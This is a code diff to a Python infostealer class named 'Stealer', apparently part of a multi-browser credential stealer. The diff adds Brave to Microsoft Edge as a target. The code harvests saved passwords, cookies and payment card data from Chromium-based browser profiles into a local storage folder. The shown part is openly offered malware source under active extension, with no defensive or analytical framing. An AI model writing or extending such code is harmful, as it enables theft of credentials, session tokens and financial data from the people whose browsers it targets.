@@ -21,7 +21,6 @@ class Stealer(Thread):
         self.config = MultistealerConfig()
 
         for status in self.config.Functions:
-
             if status in kwargs:
                 self.__dict__.update({status: kwargs[status]})
             else:
@@ -64,6 +63,16 @@ class Stealer(Thread):
                     self.config.StoragePath,
                     self.config.StorageFolder,
                     *self.config.MicrosoftEdgePaths,
+                    (self.passwords, self.cookies, self.cards),
+                    self.errors
+                )
+            },
+            {
+                "object": Chromium(
+                    "Brave",
+                    self.config.StoragePath,
+                    self.config.StorageFolder,
+                    *self.config.BravePaths,
                     (self.passwords, self.cookies, self.cards),
                     self.errors
                 )
